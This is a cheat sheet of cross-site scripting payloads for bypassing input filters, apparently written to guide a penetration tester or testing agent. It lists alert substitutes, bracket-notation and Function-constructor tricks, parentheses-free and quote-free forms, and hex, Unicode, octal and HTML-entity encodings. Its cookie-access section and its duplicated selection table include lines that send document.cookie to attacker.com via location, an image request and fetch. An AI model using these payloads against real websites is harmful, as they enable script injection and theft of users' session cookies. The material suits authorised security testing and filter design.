# JavaScript Function Alternatives

## ⚠️ CRITICAL: How to Use This File

**This file contains PATTERNS to understand, NOT functions to try blindly.**

**Before using alternatives:**
1. Identify WHICH function is blocked (alert? all dialog functions? specific pattern?)
2. Test if it's the word blocked or the pattern `functionname(` blocked
3. Filter alternatives based on your allowed characters
4. Understand WHY alternatives work, then build YOUR payload

**Remember:** Your goal is proving JavaScript execution, not specifically using `alert`. Any JS execution proves the vulnerability.

**Stop Conditions:**
- After 3-4 function alternatives fail → try different execution proof (DOM modification, cookie access)
- If ALL parentheses are blocked → use template literals or other parentheses-free methods
- After exhausting function approaches → document as heavily filtered

---

## Understanding Function Filtering

Common filters block: `alert`, `confirm`, `prompt`, `eval`

**Test approach:**
- If `alert` blocked, is `confirm` allowed?
- If function NAME blocked, are `(` `)` allowed separately?
- Is it the word or the pattern `alert(` that's blocked?

---

## Alternative Proof-of-Execution Functions

### Standard Alternatives
If `alert` is blocked:
```javascript
confirm(1)
prompt(1)
print()              // Opens print dialog
console.log(1)       // Check console
```

### Document Methods
```javascript
document.write('XSS')
document.writeln('XSS')
document.body.innerHTML='XSS'
```

### Window Methods
```javascript
window.alert(1)
self.alert(1)
top.alert(1)
parent.alert(1)
frames.alert(1)
```

### Using Constructor
```javascript
[].constructor.constructor('alert(1)')()
''.constructor.constructor('alert(1)')()
```

---

## Bypassing Function Name Filters

### Object Property Access (Bracket Notation)
```javascript
window['alert'](1)
window['al'+'ert'](1)
self['alert'](1)
this['alert'](1)
globalThis['alert'](1)
```

### Using eval with String Building
```javascript
eval('ale'+'rt(1)')
eval('al\x65rt(1)')
```

### Using Function Constructor
```javascript
Function('alert(1)')()
new Function('alert(1)')()
[]['constructor']['constructor']('alert(1)')()
```

### Hex/Unicode Escapes
```javascript
\u0061lert(1)           // \u0061 = 'a'
al\u0065rt(1)           // \u0065 = 'e'
\x61lert(1)             // \x61 = 'a'
```

### Template Literals
```javascript
alert`1`                 // No parentheses needed
```

### Using Array Methods
```javascript
[1].map(alert)
[1].find(alert)
[1].filter(alert)
[1].forEach(alert)
[1].every(alert)
[1].some(alert)
```

### Using Object Methods
```javascript
Object.keys({1:1}).map(alert)
Reflect.apply(alert, null, [1])
```

---

## Without Parentheses

If `(` and `)` are blocked:

### Template Literals
```javascript
alert`1`
confirm`1`
prompt`1`
```

### throw + onerror
```javascript
throw onerror=alert,1
// Or with assignment
onerror=alert;throw 1
```

### Using location
```javascript
location='javascript:alert%281%29'
location.href='javascript:alert%281%29'
```

### Using setTimeout/setInterval
```javascript
setTimeout`alert\x281\x29`
```

### Using import (ES6)
```javascript
import('data:text/javascript,alert(1)')
```

---

## Without Quotes

If `"` and `'` are blocked:

### Template Literals
```javascript
alert`1`
```

### Using Numbers
```javascript
alert(1)
alert(document.domain)
alert(location)
```

### Using RegExp
```javascript
alert(/XSS/.source)
alert(/XSS/)
```

### String.fromCharCode
```javascript
alert(String.fromCharCode(88,83,83))  // "XSS"
```

### Using Existing Strings
```javascript
alert(document.URL)
alert(location.href)
alert(document.cookie)
```

---

## Without alert/confirm/prompt

### Document Manipulation (Prove DOM access)
```javascript
document.body.innerHTML='<h1>XSS</h1>'
document.body.appendChild(document.createElement('h1')).innerHTML='XSS'
document.write('<h1>XSS</h1>')
```

### Cookie Access (Prove impact)
```javascript
document.location='http://attacker.com/?c='+document.cookie
new Image().src='http://attacker.com/?c='+document.cookie
fetch('http://attacker.com/?c='+document.cookie)
```

### Console (Verify execution)
```javascript
console.log('XSS')
console.error('XSS')
console.warn('XSS')
```

### Debugger (Triggers breakpoint)
```javascript
debugger
```

---

## Without Specific Characters

### Without Dots (.)
```javascript
alert(document['cookie'])
window['alert'](1)
self['alert'](1)
```

### Without Semicolons
Most JS doesn't need semicolons (ASI):
```javascript
alert(1)
```

### Without Equals Sign
Using comparison or other operators:
```javascript
alert(1)                    // No assignment needed
```

### Without Letters (Extreme)
JSFuck style (educational, rarely practical):
```javascript
// Example of no-letter JS (very long)
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+...
```

---

## Encoding Variations

### URL Encoding in javascript:
```
javascript:alert%281%29
javascript:%61lert(1)
```

### HTML Entities (in HTML attribute context)
```
javascript:alert&#40;1&#41;
javascript:alert&#x28;1&#x29;
```

### Unicode Escapes (in JS context)
```javascript
\u0061\u006c\u0065\u0072\u0074(1)  // alert(1)
```

### Hex Escapes (in JS string)
```javascript
\x61\x6c\x65\x72\x74(1)           // alert(1)
```

### Octal (in some contexts)
```javascript
\141\154\145\162\164(1)           // alert(1)
```

---

## Quick Selection Guide

| Scenario | Alternative |
|----------|-------------|
| `alert` blocked | `confirm`, `prompt`, `console.log` |
| All dialog functions blocked | `document.write`, `innerHTML` modification |
| `( )` blocked | Template literals: `alert\`1\`` |
| Entire word blocked | `window['alert'](1)`, `eval('al'+'ert(1)')` |
| Need to prove impact | `new Image().src='http://attacker.com/?'+document.cookie` |
| Only execution, any evidence | `debugger`, `console.log`, DOM modification |

---

## Quick Selection Guide

| Scenario | Alternative |
|----------|-------------|
| `alert` blocked | `confirm`, `prompt`, `console.log` |
| All dialog functions blocked | `document.write`, `innerHTML` modification |
| `( )` blocked | Template literals: `alert\`1\`` |
| Entire word blocked | `window['alert'](1)`, `eval('al'+'ert(1)')` |
| Need to prove impact | `new Image().src='http://attacker.com/?'+document.cookie` |
| Only need execution evidence | `debugger`, `console.log`, DOM modification |
